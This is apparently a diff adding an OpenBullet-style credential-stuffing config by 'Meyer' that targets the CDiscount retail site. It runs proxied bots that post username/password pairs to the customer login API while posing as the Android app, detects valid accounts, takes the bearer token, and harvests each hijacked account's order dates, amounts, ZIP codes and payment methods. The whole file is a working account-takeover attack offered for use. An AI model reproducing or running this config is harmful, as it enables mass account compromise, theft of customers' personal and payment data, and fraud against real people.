@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "CDiscount | ByMeyer",
+  "SuggestedBots": 120,
+  "LastModified": "2018-07-14T22:46:26.4003913+02:00",
+  "AdditionalInfo": "Capture Full INFO.",
+  "Author": "Meyer",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#POST_LOGIN_PAGE_|_ByMeyer REQUEST POST "https://orchestration.cdiscount.com/v5.0/Customer/Authenticate/Local" AutoRedirect=TRUE 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"isNew\":false,\"DeviceInfo\":{\"SystemName\":\"Android\",\"Model\":\"SM-N950F\",\"ApplicationVersion\":\"4.8.7\",\"Brand\":\"samsung\"},\"ScoringTagGuid\":\"5dd24bb1-800c-4326-9e49-4b4e8946f911\"}" 
+  CONTENTTYPE "application/json; charset=utf-8" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: okhttp/3.9.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "x-cds-appversion: 4.8.7" 
+  HEADER "x-cds-siteid: 202" 
+#KEY_CHECKP_|_ByMeyer KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "{\"AccessToken\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"Error\":\"invalid_grant\",\"Description\":\"Invalid credentials\"}" 
+#BEARER_|_ByMeyer PARSE "<SOURCE>" LR ":\"" "\"" Recursive=FALSE -> VAR "BEARER" "" "" 
+#GET_CAPTURE_|_ByMeyer REQUEST GET "https://orchestration.cdiscount.com/v5.0/Customer/Order/?$pageSize=10|" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: okhttp/3.9.0" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <BEARER>" 
+  HEADER "x-cds-appversion: 4.8.7" 
+  HEADER "x-cds-siteid: 202" 
+#DATE_|_ByMeyer PARSE "<SOURCE>" LR ":\"" "-" Recursive=TRUE -> CAP "Date de commande" "" "" 
+#MONTANT_|_ByMeyer PARSE "<SOURCE>" LR "Price\":" "," Recursive=TRUE -> CAP "Montant commande" "" "€" 
+#ZIP_|_ByMeyer PARSE "<SOURCE>" LR "ZipCode\":\"" "\"},\"InvoiceId\":" Recursive=TRUE -> CAP "ZIP" "" "" 
+#Payment_méthode_|_ByMeyer PARSE "<SOURCE>" LR "PaymentMode\":\"" "\"" Recursive=TRUE -> CAP "Mode de paiment" "" "" 
